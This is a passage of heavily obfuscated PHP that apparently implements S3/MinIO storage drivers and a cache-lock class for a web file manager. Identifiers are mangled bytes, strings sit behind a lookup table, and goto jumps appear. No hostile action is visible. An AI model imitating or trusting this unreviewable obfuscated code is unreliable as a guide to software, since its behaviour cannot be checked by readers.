$úÓ¤Àå˜[$—ŠÎÃöÁ[180]]; } return $Åâ‘‚ªó; } private function fileList($åÖÍ·Úè, $­Ş›ß”º = '', $±£û¿Ü = 0) { $Ñ¿ŠĞç =& $_SERVER[¹ş¤¶ĞÖ]; $”çÊÊá = rtrim($åÖÍ·Úè, $Ñ¿ŠĞç[8]) . $Ñ¿ŠĞç[8]; $ú•éÀÕ• = $this->listObjs($”çÊÊá, null, null, $­Ş›ß”º); if (!$ú•éÀÕ•) { return array($Ñ¿ŠĞç[82] => array(), $Ñ¿ŠĞç[83] => array()); } $å†Æú†ç = $Ê–›±Ç = array(); foreach ($ú•éÀÕ•[$Ñ¿ŠĞç[204]] as $¼ˆ“óøÚ) { $»°Úé¸ = $¼ˆ“óøÚ[$Ñ¿ŠĞç[32]]; if ($»°Úé¸ == $”çÊÊá) { continue; } $½Ñã¶ìê = isset($¼ˆ“óøÚ[$Ñ¿ŠĞç[76]]) ? $¼ˆ“óøÚ[$Ñ¿ŠĞç[76]] : 0; $¿ÎÑ˜úÔ = $½Ñã¶ìê == 0 && substr($»°Úé¸, strlen($»°Úé¸) - 1, 1) == $Ñ¿ŠĞç[8] ? !0 : !1; $this->cacheMethodInfoSet($»°Úé¸, $¿ÎÑ˜úÔ, $¼ˆ“óøÚ); if ($¿ÎÑ˜úÔ) { $å†Æú†ç[] = $»°Úé¸; continue; } $Ê–›±Ç[] = $±£û¿Ü ? $¼ˆ“óøÚ : $»°Úé¸; } foreach ($ú•éÀÕ•[$Ñ¿ŠĞç[205]] as $¼ˆ“óøÚ) { $å†Æú†ç[] = $¼ˆ“óøÚ[$Ñ¿ŠĞç[32]]; $this->cacheMethodInfoSet($¼ˆ“óøÚ[$Ñ¿ŠĞç[32]], !0); } $this->cacheMethodInfoSet($åÖÍ·Úè, !0); return array($Ñ¿ŠĞç[82] => $å†Æú†ç, $Ñ¿ŠĞç[83] => $Ê–›±Ç); } private function listObjs($‰ûàõÄ², $áÛ×–íÇ = null, $“ÓÓÄ™ˆ = null, $ÉõÂó» = null) { $Š…„ÊÚş =& $_SERVER[¹ş¤¶ĞÖ]; $‰ûàõÄ² = trim($‰ûàõÄ², $Š…„ÊÚş[8]); $£¦¼º€  = empty($‰ûàõÄ²) && $‰ûàõÄ² !== $Š…„ÊÚş[198] ? $Š…„ÊÚş[12] : $‰ûàõÄ² . $Š…„ÊÚş[8]; return $this->client->getBucket($this->bucket, $£¦¼º€ , $áÛ×–íÇ, $“ÓÓÄ™ˆ, $ÉõÂó», !0); } public function has($Â½…ñÍ, $ÙŸÉ‘¦â = false, $ÓÕõâß = true) { $ÔôÙ‹Ú¯ =& $_SERVER[¹ş¤¶ĞÖ]; $Â½…ñÍ = trim($Â½…ñÍ, $ÔôÙ‹Ú¯[8]); $µü­¼²Ì = empty($Â½…ñÍ) && $Â½…ñÍ !== $ÔôÙ‹Ú¯[198] ? $ÔôÙ‹Ú¯[12] : $Â½…ñÍ . $ÔôÙ‹Ú¯[8]; $êªÂè˜ = null; $¯¹ªÅÊ¢ = 500; $Ñ–ÉÙ´‘ = $ÔôÙ‹Ú¯[8]; $ÄÕˆì¿À = $ª€¹¡¼» = array(); while (!0) { $îÊ°‹±ã = $this->listObjs($Â½…ñÍ, $êªÂè˜, $¯¹ªÅÊ¢, $Ñ–ÉÙ´‘); if (!$îÊ°‹±ã) { break; } $êªÂè˜ = $îÊ°‹±ã[$ÔôÙ‹Ú¯[206]]; $²ôÍõûƒ = $îÊ°‹±ã[$ÔôÙ‹Ú¯[204]]; $üĞ¹‚Å¡ = $îÊ°‹±ã[$ÔôÙ‹Ú¯[205]]; if (empty($²ôÍõûƒ) && empty($üĞ¹‚Å¡)) { break; } if (count($²ôÍõûƒ) == 1 && $²ôÍõûƒ[0][$ÔôÙ‹Ú¯[32]] == $µü­¼²Ì) { break; } if ($ÙŸÉ‘¦â) { if (count($²ôÍõûƒ)) { $²ôÍõûƒ = array_column($²ôÍõûƒ, $ÔôÙ‹Ú¯[32]); $ÄÕˆì¿À = array_merge($ÄÕˆì¿À, $²ôÍõûƒ); } if (count($üĞ¹‚Å¡)) { $üĞ¹‚Å¡ = array_column($üĞ¹‚Å¡, $ÔôÙ‹Ú¯[32]); $ª€¹¡¼» = array_merge($ª€¹¡¼», $üĞ¹‚Å¡); } if ($êªÂè˜ === null) { break; } continue; } if ($ÓÕõâß) { if (!empty($²ôÍõûƒ)) { if (count($²ôÍõûƒ) > 1 || isset($²ôÍõûƒ[0][$ÔôÙ‹Ú¯[32]]) && $²ôÍõûƒ[0][$ÔôÙ‹Ú¯[32]] != $µü­¼²Ì) { return !0; } } } else { if (!empty($üĞ¹‚Å¡)) { return !0; } } if ($êªÂè˜ === null) { break; } } if ($ÙŸÉ‘¦â) { $ÄÕˆì¿À = array_diff($ÄÕˆì¿À, array($µü­¼²Ì)); $ÄÕˆì¿À = count(array_unique($ÄÕˆì¿À)); $ª€¹¡¼» = count(array_unique($ª€¹¡¼»)); return array($ÔôÙ‹Ú¯[207] => $ÄÕˆì¿À, $ÔôÙ‹Ú¯[208] => $ª€¹¡¼»); } return !1; } public function listAll($½ÍÓÕå›) { $çà‹õöÛ =& $_SERVER[¹ş¤¶ĞÖ]; $’¯ÍĞ€Ğ = $this->fileList($½ÍÓÕå›, $çà‹õöÛ[12], !0); $³Ø–êåÅ = array_to_keyvalue($’¯ÍĞ€Ğ[$çà‹õöÛ[83]], $çà‹õöÛ[32]); foreach ($’¯ÍĞ€Ğ[$çà‹õöÛ[82]] as $ş­­Îñ¤) { if (is_string($ş­­Îñ¤)) { $³Ø–êåÅ[$ş­­Îñ¤] = array($çà‹õöÛ[76] => 0); } } return $this->listAllFiles($½ÍÓÕå›, $³Ø–êåÅ); } public function canRead($¨Àâä÷î) { $—¯óÀÌà =& $_SERVER[¹ş¤¶ĞÖ]; $ì¤­œü = $this->client->getAccessControlPolicy($this->bucket, $¨Àâä÷î); if (!$ì¤­œü) { return !1; } return in_array($ì¤­œü, array($—¯óÀÌà[209], $—¯óÀÌà[210], $—¯óÀÌà[211])) ? !0 : !1; } public function canWrite($¥ûôóÆÍ) { $ÆŞÁ³ =& $_SERVER[¹ş¤¶ĞÖ]; $°ãõ®’° = $this->client->getAccessControlPolicy($this->bucket, $¥ûôóÆÍ); if (!$°ãõ®’°) { return !1; } return in_array($°ãõ®’°, array($ÆŞÁ³[209], $ÆŞÁ³[210])) ? !0 : !1; } public function getContent($Ò®Ë»œ) { return $this->client->getObject($this->bucket, $Ò®Ë»œ); } public function setContent($­ÑÂĞàÍ, $…Öê¾İë = '', $Œ†ğ¢£· = false) { $å¿ÍÜùĞ =& $_SERVER[¹ş¤¶ĞÖ]; $­ÑÂĞàÍ = $Œ†ğ¢£· ? trim($­ÑÂĞàÍ, $å¿ÍÜùĞ[8]) . $å¿ÍÜùĞ[8] : $­ÑÂĞàÍ; $®™¹Ê†¸ = get_file_mime(get_path_ext($­ÑÂĞàÍ)); $æŞşâ÷© = $this->client->putObject($…Öê¾İë, $this->bucket, $­ÑÂĞàÍ, $å¿ÍÜùĞ[199], array(), $®™¹Ê†¸); if (!$æŞşâ÷©) { return !1; } if ($Œ†ğ¢£·) { return !0; } $this->cacheMethod(null, null); $æŞşâ÷© = $this->copyFile($­ÑÂĞàÍ, $­ÑÂĞàÍ, array($å¿ÍÜùĞ[212] => $æŞşâ÷©[$å¿ÍÜùĞ[213]])); return $æŞşâ÷© ? !0 : !1; } public function fileSubstr($£¬Šºî™, $Ş‰ø‡´Œ, $¯ĞòÉ÷œ) { $„æ‡—½æ = $Ş‰ø‡´Œ + $¯ĞòÉ÷œ - 1; return $this->client->getObject($this->bucket, $£¬Šºî™, array($_SERVER[¹ş¤¶ĞÖ][214] => "\142\171\x74\145\163\75{$Ş‰ø‡´Œ}\x2d{$„æ‡—½æ}")); } public function upload($Œ‹«İ¹”, $¤œ®çâ , $ÒÌ¨–Ù— = false, $ ¦ÂÂÓ‹ = REPEAT_REPLACE) { $Ò¬ÁÆšÚ =& $_SERVER[¹ş¤¶ĞÖ]; $æşÓ™ä“ = array($Ò¬ÁÆšÚ[212] => @md5_file($¤œ®çâ )); $‘Âè˜¹î = array($Ò¬ÁÆšÚ[215] => get_file_mime(get_path_ext($Œ‹«İ¹”))); if (IO::size($¤œ®çâ ) <= 1024 * 1024 * 200) { $È½¢›Á = $this->client->putObjectFile($¤œ®çâ , $this->bucket, $Œ‹«İ¹”, $Ò¬ÁÆšÚ[199], $æşÓ™ä“, $‘Âè˜¹î); return !empty($È½¢›Á) ? $this->getPathOuter($Œ‹«İ¹”) : !1; } $—‹ĞŞ´ = $this->client->multiUploadObject($¤œ®çâ , $this->bucket, trim($Œ‹«İ¹”, $Ò¬ÁÆšÚ[8]), $æşÓ™ä“, $‘Âè˜¹î); return $—‹ĞŞ´ ? $this->getPathOuter($Œ‹«İ¹”) : !1; } public function download($ãô€Ä, $ŞüÑ¹êÈ) { if (!@is_dir($this->pathFather($ŞüÑ¹êÈ)) && !IO::mkdir($this->pathFather($ŞüÑ¹êÈ))) { return !1; } $ˆÉå½á« = $this->client->getObject($this->bucket, $ãô€Ä, array(), $ŞüÑ¹êÈ); return $ˆÉå½á« !== !1 ? $ŞüÑ¹êÈ : !1; } public function link($²÷ÅËäÑ, $¥Ä‹ã³Ù = array()) { $ÁÅˆøÀ÷ =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->signVer == $ÁÅˆøÀ÷[216]) { return $this->client->getAuthenticatedURL($this->bucket, $²÷ÅËäÑ, 3600 * 12, $¥Ä‹ã³Ù); } return $this->client->getObjectUrl($this->accessKey, $this->secret, $this->bucket, trim($²÷ÅËäÑ, $ÁÅˆøÀ÷[8]), 3600 * 12, $this->region, array(), !0, $¥Ä‹ã³Ù); } public function fileOut($€³’‚ü—, $ş›®Óñ£ = false, $»í÷ß‡Î = false, $İı¼òú» = '') { $óèİã› =& $_SERVER[¹ş¤¶ĞÖ]; if ($this->isFileOutServer()) { return $this->fileOutServer($€³’‚ü—, $ş›®Óñ£, $»í÷ß‡Î, $İı¼òú»); } if (!$»í÷ß‡Î) { $»í÷ß‡Î = $this->pathThis($€³’‚ü—); } $ÓÇ¦É÷À = get_file_mime(get_path_ext($»í÷ß‡Î)); if ($ÓÇ¦É÷À == $óèİã›[217]) { return parent::fileOut($€³’‚ü—, $ş›®Óñ£, $»í÷ß‡Î, $İı¼òú»); } $ö¹˜‹‚ = array($óèİã›[218] => $ÓÇ¦É÷À); if ($ş›®Óñ£) { $ö¹˜‹‚[$óèİã›[219]] = $óèİã›[220] . rawurlencode($»í÷ß‡Î); } else { } $•ùœì¾Ú = $this->link($€³’‚ü—, $ö¹˜‹‚); $this->fileOutLink($•ùœì¾Ú); } public function fileOutServer($ªîØÚÊß, $Œ„­˜×İ = false, $Û¬Î öö = false, $ªæµ€‚– = '') { parent::fileOut($ªîØÚÊß, $Œ„­˜×İ, $Û¬Î öö, $ªæµ€‚–); } public function fileOutImageServer($¤­ÊĞíò, $Õ‘›’®í = 250) { parent::fileOutImage($¤­ÊĞíò, $Õ‘›’®í); } public function hashMd5($­ıßÃ»›, $Îù‚à©¯ = '') { $Æú”Œğ =& $_SERVER[¹ş¤¶ĞÖ]; $Áğ¢Óşş = $this->objectMeta($­ıßÃ»›); if (!$Áğ¢Óşş) { return !1; } $Îù‚à©¯ = $Îù‚à©¯ ? $Îù‚à©¯ : _get($Áğ¢Óşş, $Æú”Œğ[221]); $Îù‚à©¯ = $Îù‚à©¯ ? $Îù‚à©¯ : _get($Áğ¢Óşş, $Æú”Œğ[213], $Æú”Œğ[12]); return $Îù‚à©¯; } public function uploadFormData($¡€˜“Ä¯, $¾ü’¹¬§ = 3600) { $á¬ÉïÂõ =& $_SERVER[¹ş¤¶ĞÖ]; $Íı‰¿‚ = $this->pathFather($¡€˜“Ä¯); $ÊÔşÍÆ· = $this->client->getHttpUploadPostParams($this->bucket, $Íı‰¿‚, $á¬ÉïÂõ[199], $¾ü’¹¬§); return array_merge((array) $ÊÔşÍÆ·, array($á¬ÉïÂõ[182] => $this->getHost())); } public function multiUploadFormData($œüø³­, $‚¿…ˆ¦ï = 3600) { $ÄÎ£æ„™ =& $_SERVER[¹ş¤¶ĞÖ]; $§öÒæ† = gmdate($ÄÎ£æ„™[222]); $‚ùƒ¤Ğ› = array(); $£ ŸÖ€ = $this->client->getUploadId($this->bucket, $œüø³­, $‚ùƒ¤Ğ›); if (!$£ ŸÖ€) { return !1; } return array($ÄÎ£æ„™[223] => $£ ŸÖ€, $ÄÎ£æ„™[182] => $this->getHost() . $ÄÎ£æ„™[8] . $this->pathEncode($œüø³­), $ÄÎ£æ„™[224] => $§öÒæ†, $ÄÎ£æ„™[94] => $œüø³­); } public function multiUploadAuthData($­·Òö¡ù, $­¤¤Ù„» = array()) { $„¼Ç‚¡Ğ =& $_SERVER[¹ş¤¶ĞÖ]; $¿Â¡å”» = isset($­¤¤Ù„»[$„¼Ç‚¡Ğ[224]]) ? $­¤¤Ù„»[$„¼Ç‚¡Ğ[224]] : gmdate($„¼Ç‚¡Ğ[222]); $ßÇûµ­ä = isset($­¤¤Ù„»[$„¼Ç‚¡Ğ[174]]) ? $­¤¤Ù„»[$„¼Ç‚¡Ğ[174]] : $„¼Ç‚¡Ğ[12]; $½ÅŒ£ö˜ = $­¤¤Ù„»[$„¼Ç‚¡Ğ[94]]; unset($­¤¤Ù„»[$„¼Ç‚¡Ğ[94]]); if (isset($­¤¤Ù„»[$„¼Ç‚¡Ğ[225]])) { $­¤¤Ù„»[$„¼Ç‚¡Ğ[224]] = $¿Â¡å”»; return $this->listUploadParts($½ÅŒ£ö˜, $­¤¤Ù„»); } $Ô²úŞË‡ = array($„¼Ç‚¡Ğ[226], $„¼Ç‚¡Ğ[12], $„¼Ç‚¡Ğ[120], $„¼Ç‚¡Ğ[12], "\x78\55\x61\x6d\x7a\x2d\144\x61\164\145\72{$¿Â¡å”»}", $„¼Ç‚¡Ğ[8] . $this->bucket . $„¼Ç‚¡Ğ[8] . $this->pathEncode($½ÅŒ£ö˜) . $ßÇûµ­ä); if (strpos($ßÇûµ­ä, $„¼Ç‚¡Ğ[227]) === 0) { $Ô²úŞË‡[0] = $„¼Ç‚¡Ğ[228]; } if (isset($­¤¤Ù„»[$„¼Ç‚¡Ğ[229]]) && $­¤¤Ù„»[$„¼Ç‚¡Ğ[229]] == $„¼Ç‚¡Ğ[230]) { $Ô²úŞË‡[0] = $„¼Ç‚¡Ğ[230]; } $ü¸ŞéÆ´ = implode($„¼Ç‚¡Ğ[231], $Ô²úŞË‡); $‚š¶œÍÓ = base64_encode(hash_hmac($„¼Ç‚¡Ğ[232], $ü¸ŞéÆ´, $this->secret, !0)); $ğ„Õñ€š = $„¼Ç‚¡Ğ[233] . $this->accessKey . $„¼Ç‚¡Ğ[4] . $‚š¶œÍÓ; if (strpos($ßÇûµ­ä, $„¼Ç‚¡Ğ[227]) === 0) { return array($„¼Ç‚¡Ğ[234] => $ğ„Õñ€š, $„¼Ç‚¡Ğ[224] => $¿Â¡å”»); } return $ğ„Õñ€š; } public function listUploadParts($µŒ°¨, $Ë½¸êá­ = array()) { $‡¹°¢½Œ =& $_SERVER[¹ş¤¶ĞÖ]; $êË¢¦¾· = str_replace($‡¹°¢½Œ[235], $‡¹°¢½Œ[12], $Ë½¸êá­[$‡¹°¢½Œ[174]]); $… Ÿıƒ = $this->client->listParts($this->bucket, $µŒ°¨, $êË¢¦¾·); if (!$… Ÿıƒ) { return !1; } unset($Ë½¸êá­[$‡¹°¢½Œ[225]], $Ë½¸êá­[$‡¹°¢½Œ[229]]); $Ë½¸êá­[$‡¹°¢½Œ[94]] = $µŒ°¨; $îÓÒÓ· = $this->multiUploadAuthData($µŒ°¨, $Ë½¸êá­); if (empty($îÓÒÓ·)) { return !1; } return array($‡¹°¢½Œ[234] => $îÓÒÓ·, $‡¹°¢½Œ[224] => $Ë½¸êá­[$‡¹°¢½Œ[224]], $‡¹°¢½Œ[236] => $… Ÿıƒ); } public function getHost() { return parent::getHost() . $_SERVER[¹ş¤¶ĞÖ][8] . $this->bucket; } public function size($®ıÚù“å) { $Ì®äá ç = $this->objectMeta($®ıÚù“å); return $Ì®äá ç ? $Ì®äá ç[$_SERVER[¹ş¤¶ĞÖ][76]] : 0; } public function info($§†íîÏ¥) { if ($this->isFolder($§†íîÏ¥)) { return $this->folderInfo($§†íîÏ¥); } else { if ($this->isFile($§†íîÏ¥)) { return $this->fileInfo($§†íîÏ¥); } } return !1; } public function exist($”Á×Äˆ²) { return $this->isFile($”Á×Äˆ²) || $this->isFolder($”Á×Äˆ²); } public function isFile($˜¹½Ê¤æ) { return !$this->isFolder($˜¹½Ê¤æ) && $this->objectMeta($˜¹½Ê¤æ); } public function isFolder($İÎæéì) { return $this->cacheMethod($_SERVER[¹ş¤¶ĞÖ][165], $İÎæéì); } protected function objectMeta($½Ó÷ûØË) { return $this->cacheMethod($_SERVER[¹ş¤¶ĞÖ][167], $½Ó÷ûØË); } protected function _objectMeta($˜®ºëú) { $Ñ‹œ¨“ =& $_SERVER[¹ş¤¶ĞÖ]; $˜®ºëú = rtrim($˜®ºëú, $Ñ‹œ¨“[8]); try { $ƒâù ¦· = $this->client->getObjectInfo($this->bucket, $˜®ºëú); if (!isset($ƒâù ¦·[$Ñ‹œ¨“[221]]) && isset($ƒâù ¦·[$Ñ‹œ¨“[237]])) { $ƒâù ¦·[$Ñ‹œ¨“[221]] = $ƒâù ¦·[$Ñ‹œ¨“[237]]; } } catch (Exception $†¤°Ëı) { $ƒâù ¦· = !1; } if (!$ƒâù ¦·) { } return $ƒâù ¦·; } protected function _isFolder($ˆïõÍ‚) { $Ğïº½£Ö =& $_SERVER[¹ş¤¶ĞÖ]; $ˆïõÍ‚ = rtrim($ˆïõÍ‚, $Ğïº½£Ö[8]); if ($ˆïõÍ‚ == $Ğïº½£Ö[12] || $ˆïõÍ‚ == $Ğïº½£Ö[8]) { return !0; } $ıÁ±˜ä„ = $this->client->getBucket($this->bucket, $ˆïõÍ‚, null, 1); if (empty($ıÁ±˜ä„[$Ğïº½£Ö[204]])) { return !1; } $šÊ = $ıÁ±˜ä„[$Ğïº½£Ö[204]][0][$Ğïº½£Ö[32]]; return stripos($šÊ, $ˆïõÍ‚ . $Ğïº½£Ö[8]) === 0 ? !0 : !1; if (substr($šÊ, -1) == $Ğïº½£Ö[8]) { return !0; } if (get_path_this($šÊ) == get_path_this($ˆïõÍ‚)) { return !1; } return !0; } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($çé¢½ôş) { parent::__construct($çé¢½ôş); $this->signatureVersion($_SERVER[¹ş¤¶ĞÖ][216]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function uploadFormData($½€ªä°, $±Ïªğ‰ = 3600) { $Ë®ÁÖš =& $_SERVER[¹ş¤¶ĞÖ]; $ºËâêÈ = $Ë®ÁÖš[199]; $ï ü¯® = $Ë®ÁÖš[238]; $†ÕœúÛ… = $Ë®ÁÖš[62]; $äøéÁˆ = gmdate($Ë®ÁÖš[239]); $ş ¶›ŞÏ = gmdate($Ë®ÁÖš[240]); $Èó´šš = $Ë®ÁÖš[241]; $Ò­·õ€î = $±Ïªğ‰ . $Ë®ÁÖš[12]; $™×Åä’· = $Ë®ÁÖš[242]; $Ş·ûºŒ„ = array($this->accessKey, $ş ¶›ŞÏ, $this->region, $†ÕœúÛ…, $Èó´šš); $¾àÀäú = implode($Ë®ÁÖš[8], $Ş·ûºŒ„); $‡»’šßà = array($Ë®ÁÖš[243] => gmdate($Ë®ÁÖš[244], strtotime($Ë®ÁÖš[245])), $Ë®ÁÖš[246] => array(array($Ë®ÁÖš[247] => $this->bucket), array($Ë®ÁÖš[248] => $ºËâêÈ), array($Ë®ÁÖš[249], $Ë®ÁÖš[250], $Ë®ÁÖš[12]), array($Ë®ÁÖš[249], $Ë®ÁÖš[251], $Ë®ÁÖš[12]), array($Ë®ÁÖš[249], $Ë®ÁÖš[252], $Ë®ÁÖš[12]), array($Ë®ÁÖš[253] => $™×Åä’·), array($Ë®ÁÖš[254] => $¾àÀäú), array($Ë®ÁÖš[255] => $ï ü¯®), array($Ë®ÁÖš[256] => $äøéÁˆ), array($Ë®ÁÖš[257] => $Ò­·õ€î))); $¢ùÕÅÍ› = base64_encode(json_encode($‡»’šßà)); $Æ¼§ñ“¬ = hash_hmac($Ë®ÁÖš[258], $ş ¶›ŞÏ, $Ë®ÁÖš[259] . $this->secret, !0); $‹©Ü«ŒĞ = hash_hmac($Ë®ÁÖš[258], $this->region, $Æ¼§ñ“¬, !0); $¥ÖèŒÕ” = hash_hmac($Ë®ÁÖš[258], $†ÕœúÛ…, $‹©Ü«ŒĞ, !0); $¿üçÔü‡ = hash_hmac($Ë®ÁÖš[258], $Èó´šš, $¥ÖèŒÕ”, !0); $¹ù¾Äåë = hash_hmac($Ë®ÁÖš[258], $¢ùÕÅÍ›, $¿üçÔü‡); $úÉÖÌìó = array($Ë®ÁÖš[215] => $Ë®ÁÖš[12], $Ë®ÁÖš[260] => $Ë®ÁÖš[12], $Ë®ÁÖš[248] => $ºËâêÈ, $Ë®ÁÖš[253] => $™×Åä’·, $Ë®ÁÖš[261] => $¢ùÕÅÍ›, $Ë®ÁÖš[262] => $¾àÀäú, $Ë®ÁÖš[263] => $ï ü¯®, $Ë®ÁÖš[264] => $äøéÁˆ, $Ë®ÁÖš[265] => $Ò­·õ€î, $Ë®ÁÖš[266] => $¹ù¾Äåë, $Ë®ÁÖš[182] => $this->getHost()); return $úÉÖÌìó; } } goto Aˆñ±¿°‚È; cëéé©ááá: class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $İ†ÖÍ¯õ =& $_SERVER[¹ş¤¶ĞÖ]; if (self::$handle) { return self::$handle; } $ïãÚÙš¦ = $GLOBALS[$İ†ÖÍ¯õ[6]][$İ†ÖÍ¯õ[378]]; self::$timeout = $ïãÚÙš¦[$İ†ÖÍ¯õ[866]] ? $ïãÚÙš¦[$İ†ÖÍ¯õ[866]] : 10; $ÃÄª©¼Ÿ = _get($GLOBALS[$İ†ÖÍ¯õ[6]], $İ†ÖÍ¯õ[867]); $îĞÒšî§ = $ïãÚÙš¦[$İ†ÖÍ¯õ[853]] ? $ïãÚÙš¦[$İ†ÖÍ¯õ[853]] : $İ†ÖÍ¯õ[200]; if ($îĞÒšî§ == $İ†ÖÍ¯õ[21] && $ÃÄª©¼Ÿ == $İ†ÖÍ¯õ[13]) { $îĞÒšî§ = $İ†ÖÍ¯õ[200]; } switch ($îĞÒšî§) { case $İ†ÖÍ¯õ[856]: self::$handle = new CacheLockRedis(); break; case $İ†ÖÍ¯õ[857]: self::$handle = new CacheLockMemcached(); break; case $İ†ÖÍ¯õ[21]: self::$handle = new CacheLockDatabase(); break; case $İ†ÖÍ¯õ[200]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($İ†ÖÍ¯õ[868], $İ†ÖÍ¯õ[869]); } return self::$handle; } private static function key($Ê©ÕòÈ¼) { return $_SERVER[¹ş¤¶ĞÖ][870] . Cache::key($Ê©ÕòÈ¼); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($˜Øüç¢ó = '') { self::$errorMsg = $˜Øüç¢ó; } public static function lockGlobal($éİÃ÷´å, $Ô²œÇ†µ) { return self::lock($éİÃ÷´å, $Ô²œÇ†µ, !0); } public static function lock($„„¸¾ó‚, $š×Ê“…š = false, $¿ÇøÓ¡ = false) { $ßˆ­»÷« =& $_SERVER[¹ş¤¶ĞÖ]; $ƒ‚‡É = self::init(); $Ñ„Çü¥ã = self::key($„„¸¾ó‚); $š×Ê“…š = $š×Ê“…š ? $š×Ê“…š : self::$timeout; $›×ˆ¨¢‹ = timeFloat(); $µÏƒùŠ• = $ƒ‚‡É->lock($Ñ„Çü¥ã, $š×Ê“…š); $ˆ®¢ªîƒ = timeFloat(); if (!$µÏƒùŠ•) { $°ØÕ§†ê = "\154\157\143\x6b\x20\145\162\162\x6f\x72\x3b\x6b\x65\x79\x3d{$„„¸¾ó‚}\73\x74\x69\x6d\145\x3d{$š×Ê“…š}\73" . self::$errorMsg . $ßˆ­»÷«[71] . get_caller_msg(); $§¨œÜı¥ = LNG($ßˆ­»÷«[871]) . "\x28{$š×Ê“…š}\x73\x29\x2e" . LNG($ßˆ­»÷«[872]); $§¨œÜı¥ .= $ßˆ­»÷«[873]; if (is_string(self::$errorMsg) && self::$errorMsg) { $§¨œÜı¥ = $§¨œÜı¥ . $ßˆ­»÷«[874] . self::$errorMsg; } write_log($ßˆ­»÷«[875] . sprintf($ßˆ­»÷«[876], timeFloat() - $›×ˆ¨¢‹) . $ßˆ­»÷«[877] . $°ØÕ§†ê . $ßˆ­»÷«[878] . error_get_last(), $ßˆ­»÷«[869]); show_json($§¨œÜı¥, !1); } if (!$¿ÇøÓ¡) { self::$lockItem[$Ñ„Çü¥ã] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $„‚˜÷ëë = number_format(timeFloat() - $ˆ®¢ªîƒ, 3); write_log($ßˆ­»÷«[879] . $„„¸¾ó‚ . $ßˆ­»÷«[880] . $„‚˜÷ëë, $ßˆ­»÷«[869]); } return $µÏƒùŠ•; } public static function lockGet($Õ¡È²Ù‰) { $¸ì½½Ù† = self::key($Õ¡È²Ù‰); if (self::$lockItem[$¸ì½½Ù†]) { return self::$lockItem[$¸ì½½Ù†]; } return self::init()->lockGet($¸ì½½Ù†); } public static function unlock($ûÑÍ¢¸) { $ïÅš·¾ =& $_SERVER[¹ş¤¶ĞÖ]; $™Äµ¬‘¨ = self::key($ûÑÍ¢¸); self::$lockItem[$™Äµ¬‘¨] = null; self::init()->unlock($™Äµ¬‘¨); if (GLOBAL_DEBUG_LOG_ALL) { write_log($ïÅš·¾[881] . $ûÑÍ¢¸, $ïÅš·¾[869]); } return; } public static function unlockRuntime() { $Öî®•‹¼ =& $_SERVER[¹ş¤¶ĞÖ]; $Ş×¯¼ïÀ = self::init(); $ÕˆşıÎÕ = !1; foreach (self::$lockItem as $° ¶¾¯· => $œßû±¶Ñ) { if (!$œßû±¶Ñ) { continue; } $Ş×¯¼ïÀ->unlock($° ¶¾¯·); if (!$ÕˆşıÎÕ) { $ÕˆşıÎÕ = !0; write_log($Öî®•‹¼[882] . $° ¶¾¯· . $Öî®•‹¼[71] . get_caller_msg(), $Öî®•‹¼[869]); continue; } write_log($Öî®•‹¼[882] . $° ¶¾¯·, $Öî®•‹¼[869]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $ó¬ï¥òÉ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($Öî®•‹¼[883] . $ó¬ï¥òÉ . $Öî®•‹¼[884] . ACTION, $Öî®•‹¼[869]); } } public static function fileLock($íÑ‡åî“) { $›ì¿ÒŠú =& $_SERVER[¹ş¤¶ĞÖ]; if (!$GLOBALS[$›ì¿ÒŠú[885]]) { $GLOBALS[$›ì¿ÒŠú[885]] = array(); } $GLOBALS[$›ì¿ÒŠú[885]][$íÑ‡åî“] = !1; $ •ŠØõ = fopen(DATA_PATH . $íÑ‡åî“ . $›ì¿ÒŠú[886], $›ì¿ÒŠú[887]); if (!$ •ŠØõ) { return !1; } $GLOBALS[$›ì¿ÒŠú[885]][$íÑ‡åî“] = $ •ŠØõ; if (flock($ •ŠØõ, LOCK_EX)) { return !0; } self::unlock($íÑ‡åî“); show_json($›ì¿ÒŠú[888], !1); return !1; } public static function fileUnlock($ğØ´Õ–˜) { $Ô”‘Šİ =& $_SERVER[¹ş¤¶ĞÖ]; $ŸÎ‰ÚßÊ = $GLOBALS[$Ô”‘Šİ[885]][$ğØ´Õ–˜]; if (!$ŸÎ‰ÚßÊ) { return; } $GLOBALS[$Ô”‘Šİ[885]][$ğØ´Õ–˜] = !1; flock($ŸÎ‰ÚßÊ, LOCK_UN); fclose($ŸÎ‰ÚßÊ); } public static function fileUnlockAll() { $¼ñ¿ù’¨ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$GLOBALS[$¼ñ¿ù’¨[885]]) { return; } foreach ($GLOBALS[$¼ñ¿ù’¨[885]] as $²ıç† => $Šä«Ïªç) { if (!$Šä«Ïªç) { continue; } $GLOBALS[$¼ñ¿ù’¨[885]][$²ıç†] = !1; flock($Šä«Ïªç, LOCK_UN); fclose($Šä«Ïªç); } $GLOBALS[$¼ñ¿ù’¨[885]] = array(); } } function cacheLockWait() { usleep(mt_rand(200, 5000)); } class CacheLockFile { private static $cachePath; private static $caches; public function __construct() { $ĞŞ…ÔÖ =& $_SERVER[¹ş¤¶ĞÖ]; $î²¦Æî… = $GLOBALS[$ĞŞ…ÔÖ[6]][$ĞŞ…ÔÖ[378]]; self::$cachePath = $î²¦Æî…[$ĞŞ…ÔÖ[200]][$ĞŞ…ÔÖ[84]]; @mkdir(self::$cachePath, DEFAULT_PERRMISSIONS, !0); } public function lock($ŠºÆå……, $’› ş¦õ = 0) { $‡Í¡‹İ— =& $_SERVER[¹ş¤¶ĞÖ]; $Ñª™—Ïš = microtime(!0); $ØÁäÔ™¼ = $Ñª™—Ïš + $’› ş¦õ + 0.0001; $½Ï¤êä’ = rtrim(self::$cachePath, $‡Í¡‹İ—[8]) . $‡Í¡‹İ—[889] . md5($ŠºÆå……) . $‡Í¡‹İ—[886]; if (file_exists($½Ï¤êä’) && filemtime($½Ï¤êä’) && filemtime($½Ï¤êä’) < time() - 10) { @unlink($½Ï¤êä’); } do { if (file_exists($½Ï¤êä’)) { cacheLockWait(); continue; } $½ÆÒÅÃæ = 